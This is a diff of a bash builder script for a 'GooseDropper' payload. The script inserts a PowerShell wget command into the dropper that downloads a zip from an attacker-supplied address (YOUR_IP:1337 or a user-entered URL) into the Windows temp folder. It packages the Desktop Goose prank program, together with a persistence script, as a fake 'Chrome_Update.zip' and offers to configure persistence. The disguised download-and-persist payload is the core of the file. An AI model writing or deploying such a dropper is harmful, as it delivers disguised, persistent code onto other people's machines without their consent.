@@ -21,9 +21,9 @@ elif [ "${DL}" == "2" ];
 then
 	#Get your URL
 	read -p "Enter your URL: " SRC
-
+	SRC="$(echo "$SRC" | sed 's/\//\\\//g')"
 	#Add your URL to the payload
-	sed -i "s/powershell wget YOUR_IP:1337\/Chrome_Update.zip -OutFile \$ENV:Temp\/Updater.zip/powershell \"wget \'$SRC\' -OutFile \$ENV:Temp\/Updater.zip\"/" GooseDropper.txt
+	sed -i "s/powershell wget YOUR_IP:1337\/Chrome_Update.zip -OutFile \$ENV:Temp\/Update.zip/powershell \"wget \'${SRC}\' -OutFile \$ENV:Temp\/Updater.zip\"/" GooseDropper.txt
 	
 	#Remind users to have the zip ready
 	echo "Please ensure a ZIP file with proper contents and formatting is hosted at the provided URL"
@@ -36,21 +36,29 @@ else
 
 fi
 
+read -p "Create ZIP file to deliver Desktop Goose? [Y/N]: " COMP
+
 #Check if Desktop Goose is present in this directory
 GOOSE="$(ls | grep 'Desktop Goose v0.31.zip')"
 
-if [ "${GOOSE}" == "" ];
+if [ "${COMP,,}" == "y" ];
 then
-	echo "Desktop Goose is not present in this directory, download it, or move it here"
-	exit
 
+	if [ "${GOOSE}" == "" ];
+	then
+		echo "Desktop Goose is not present in this directory, download it, or move it here"
+		exit
+
+	else
+		unzip "Desktop Goose v0.31.zip"
+		mv "Desktop Goose v0.31/DesktopGoose v0.31" Update
+		mv PersistentGoose.ps1 Update/
+		zip -r Chrome_Update.zip Update
+		rm -rf "Desktop Goose v0.31"* Update
+		clear
+	fi
 else
-	unzip "Desktop Goose v0.31.zip"
-	mv "Desktop Goose v0.31/DesktopGoose v0.31" Update
-	mv PersistentGoose.ps1 Update/
-	zip -r Chrome_Update.zip Update
-	rm -rf "Desktop Goose v0.31"* Update
-	clear
+	break
 fi
 
 read -p "Configure Persistence? [Y/N]: " PERSIST
